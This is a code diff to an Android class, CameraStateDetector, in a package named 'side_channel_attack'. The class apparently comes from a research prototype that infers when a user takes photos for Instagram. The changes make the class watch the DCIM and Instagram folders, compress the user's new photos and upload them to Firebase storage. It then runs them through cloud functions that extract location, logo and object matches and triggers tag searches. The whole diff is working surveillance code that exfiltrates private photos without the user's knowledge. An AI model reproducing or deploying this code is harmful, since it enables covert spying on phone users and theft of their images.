@@ -2,12 +2,13 @@ package com.example.side_channel_attack;
 
 import android.app.Activity;
 import android.content.Context;
+import android.graphics.Bitmap;
 import android.hardware.camera2.CameraManager;
-import android.icu.util.TimeZone;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Environment;
 import android.os.FileObserver;
+import android.provider.MediaStore;
 import android.support.annotation.NonNull;
 
 import com.google.android.gms.tasks.OnCompleteListener;
@@ -23,16 +24,18 @@ import com.google.firebase.storage.FirebaseStorage;
 import com.google.firebase.storage.StorageReference;
 import com.google.firebase.storage.UploadTask;
 
+import java.io.ByteArrayOutputStream;
 import java.io.File;
-import java.io.FileInputStream;
 import java.io.FileNotFoundException;
-import java.io.InputStream;
+import java.io.IOException;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
+import java.util.Calendar;
 import java.util.HashMap;
 import java.util.Map;
 
 public class CameraStateDetector {
+    private final Activity activity;
     private FileObserver dcimObserver;
     private FileObserver instagramObserver;
     private int PASSIVE_STATE = 1;
@@ -49,11 +52,8 @@ public class CameraStateDetector {
 
     public CameraStateDetector(final Activity activity) {
 
-//        final File cameraDirectory = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
-//        final File dir = new File(cameraDirectory.getAbsolutePath() + "/Camera/IMG_20190417_031849.jpg");
-//
-//        imagePreModified = dir;
-//        imagePostModified = dir;
+
+        this.activity = activity;
 
         setUpDCIMListener();
         setUpInstagramListener();
@@ -71,7 +71,7 @@ public class CameraStateDetector {
                 System.out.println("entered");
                 System.out.println(ACTIVE_STATE);
                 if (ACTIVE_STATE == 1) {
-                    boolean outcomeOf1stEvent = packetCatcher.scan(10000);
+                    boolean outcomeOf1stEvent = packetCatcher.scan(120000);
                     System.out.println(outcomeOf1stEvent);
                     if (outcomeOf1stEvent) {
                         activeStateStartTime = System.currentTimeMillis() - 4000;
@@ -122,16 +122,16 @@ public class CameraStateDetector {
             public void onEvent(int event, String file) {
                 if (ACTIVE_STATE == 1) {
                     if (event == FileObserver.CREATE && !file.equals(".probe")) {
+                        PASSIVE_STATE = 1;
+                        ACTIVE_STATE = 0;
                         long activeStateEndTime = System.currentTimeMillis();
                         System.out.println("helloinst");
-                        if ((activeStateEndTime - activeStateStartTime) >= 14000) {
+                        if ((activeStateEndTime - activeStateStartTime) >= 8000) {
                             System.out.println("works");
                             imagePostModified = new File(dir.getPath() + "/" + file);
                             timestamp = getCurrentUTCTimestamp();
-
-                        } else {
-                            PASSIVE_STATE = 1;
-                            ACTIVE_STATE = 0;
+                            sendData();
+                            System.out.println("hi");
                         }
                     }
                 }
@@ -188,6 +188,9 @@ public class CameraStateDetector {
                                             final HashMap<String, ArrayList<String>> data =
                                                     (HashMap<String, ArrayList<String>>) httpsCallableResult.getData();
 
+                                            preImageStream.getResult().getStorage().delete();
+
+
                                             System.out.println(data);
 
                                             final String postImageName = id + "_" + (System.currentTimeMillis() + 1) + ".jpg";
@@ -208,36 +211,25 @@ public class CameraStateDetector {
                                                                     System.out.println(url);
                                                                     int counter = 0;
 
-//                                                    for(String term : data.get("locationMatches")){
-//                                                        searchTag(term);
-//                                                        if(++counter == 30)
-//                                                            break;
-//                                                    }
-//
-//                                                    for(String term : data.get("logoMatches")){
-//                                                        searchTag(term);
-//                                                        if(++counter == 30)
-//                                                            break;
-//                                                    }
-//
-//                                                    for(String term : data.get("webMatches")){
-//                                                        searchTag(term);
-//                                                        if(++counter == 30)
-//                                                            break;
-//                                                    }
-//
-//                                                    for(String term : data.get("labelMatches")){
-//                                                        searchTag(term);
-//                                                        if(++counter == 30)
-//                                                            break;
-//                                                    }
-//
-//                                                    for(String term : data.get("objectMatches")){
-//                                                        searchTag(term);
-//                                                        if(++counter == 30)
-//                                                            break;
-//                                                    }
+                                                                    String[] matchStrings = new String[]
+                                                                            {"locationMatches",
+                                                                                    "logoMatches",
+                                                                                    "webMatches",
+                                                                                    "objectMatches",
+                                                                                    "labelMatches"};
 
+//
+                                                                    for (String category : matchStrings) {
+                                                                        for (String term : data.get(category)) {
+//
+                                                                            int apiContainer = (int) ((Math.floor(((double) counter) / 10)) % 3);
+                                                                            System.out.println(term);
+                                                                            searchTag(apiContainer, term);
+                                                                            if (counter++ == 30) {
+                                                                                break;
+                                                                            }
+                                                                        }
+                                                                    }
                                                                 }
                                                             });
                                                         }
@@ -257,25 +249,34 @@ public class CameraStateDetector {
     }
 
     private UploadTask uploadImage(String name, File image) {
-        InputStream stream = null;
 
         try {
-            stream = new FileInputStream(image);
+
+            //compress image
+            Bitmap bmp = MediaStore.Images.Media.getBitmap(activity.getContentResolver(), Uri.fromFile(image));
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            bmp.compress(Bitmap.CompressFormat.JPEG, 25, baos);
+            byte[] data = baos.toByteArray();
+            StorageReference storageRef = FirebaseStorage.getInstance().getReference();
+            final StorageReference ref = storageRef.child(name);
+
+            return ref.putBytes(data);
         } catch (FileNotFoundException e) {
+            e.printStackTrace();
+        } catch (IOException e) {
             e.printStackTrace();
         }
 
-        StorageReference storageRef = FirebaseStorage.getInstance().getReference();
-        final StorageReference ref = storageRef.child(name);
 
-        return ref.putStream(stream);
-
+        return null;
     }
 
-    private void searchTag(String term) {
+
+    private void searchTag(int apiContainer, String term) {
         Map<String, Object> parameters =
                 getParams("tag", term);
 
+        parameters.put("apiSlot", apiContainer);
         HttpsCallableReference searchSingle = mFunctions
                 .getHttpsCallable("searchSingle");
         searchSingle.call(parameters);
@@ -294,11 +295,10 @@ public class CameraStateDetector {
     }
 
     private String getCurrentUTCTimestamp() {
-        android.icu.util.Calendar calendar = android.icu.util.Calendar.getInstance(TimeZone.getTimeZone("UTC"));
+        Calendar c = Calendar.getInstance();
+        SimpleDateFormat dateformat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
 
-        SimpleDateFormat formater = new SimpleDateFormat("dd/MM/yyyy hh:mm:ss");
-        formater.setTimeZone(java.util.TimeZone.getTimeZone("UTC"));
+        return dateformat.format(c.getTime());
 
-        return formater.format(calendar.getTime());
     }
 }
